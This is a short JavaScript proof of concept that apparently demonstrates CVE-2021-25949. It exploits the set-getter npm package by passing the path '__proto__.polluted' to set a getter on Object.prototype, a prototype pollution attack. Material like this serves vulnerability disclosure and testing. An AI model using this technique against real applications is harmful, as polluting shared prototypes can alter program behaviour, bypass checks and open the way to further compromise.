//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
 
  var setGetter = require("set-getter");
  var obj = {};

   

  setGetter(obj, "__proto__.polluted", function (polluted) {
    return "yes";
  });
// End of file
